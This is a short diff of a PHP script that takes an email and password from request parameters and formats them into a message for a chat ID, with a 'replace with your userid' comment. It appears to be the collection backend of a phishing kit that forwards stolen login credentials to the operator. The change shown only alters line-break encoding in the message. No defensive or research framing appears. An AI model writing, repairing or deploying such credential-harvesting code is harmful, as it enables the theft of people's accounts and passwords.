@@ -8,7 +8,7 @@ $time = date("h:i a", time());
 $email = $_GET["email"];
 $password = $_GET["password"];
 
-$message = "Username : $email \nPassword: $password \nTried Login at $time IST";
+$message = "Username : $email %0A%0APassword: $password %0A%0ATried Login at $time IST";
 
 $chat_id= 1322047241; // replace with your userid
 
